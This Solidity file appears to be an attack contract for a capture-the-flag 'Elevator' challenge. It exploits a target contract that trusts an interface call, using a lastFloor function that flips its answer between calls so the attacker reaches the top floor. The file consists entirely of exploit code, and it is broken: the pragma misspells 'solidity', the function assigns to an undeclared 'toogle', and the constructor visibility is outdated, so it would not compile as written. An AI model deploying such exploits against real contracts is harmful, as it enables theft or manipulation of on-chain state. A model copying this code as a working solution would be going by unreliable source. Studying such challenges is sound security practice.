pragma soldity 0.8.9;

import "./Elevator.sol";

contract ElevatorAttack {
    bool public toggle = true;
    Elevator public enemy;

    constructor(address _enemyAddress) public {
        enemy = Elevator(_enemyAddress);
    }

    function lastFloor(uint256) public returns (bool) {
        toogle = !toggle;
        return toggle;
    }

    function top(uint256 _floor) public {
        enemy.goTo(_floor);
    }
}
